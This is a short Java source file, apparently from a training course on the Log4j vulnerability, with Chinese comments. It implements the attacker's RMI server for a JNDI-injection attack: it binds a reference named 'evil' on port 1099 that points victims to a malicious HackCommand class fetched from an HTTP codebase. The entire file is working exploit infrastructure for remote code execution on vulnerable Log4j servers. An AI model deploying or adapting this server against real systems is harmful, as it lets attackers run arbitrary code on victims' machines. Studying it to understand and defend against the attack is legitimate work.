package com.atguigu.nio.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RmiServer {

    public static void main(String[] args) throws Exception {
        // className 远程加载时所使用的类名
        // classFactory 加载的class中需要实例化类的名称
        // classFactoryLocation 提供classes数据的地址可以是file/ftp/http等协议
        Reference reference = new Reference("com.atguigu.nio.log4j.HackCommand",
                "com.atguigu.nio.log4j.HackCommand", "http://localhost:8080/");

        // 因为reference没有实现remote接口也没有继承unicastRemoteObject类
        // 所以不能作为远程对象bind到注册中心，所以需要使用referenceWrapper对reference的实例进行一个封装
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        // 绑定rmi服务到1099端口object，提供恶意类的rmi服务
        LocateRegistry.createRegistry(1099).bind("evil", referenceWrapper);
    }
}
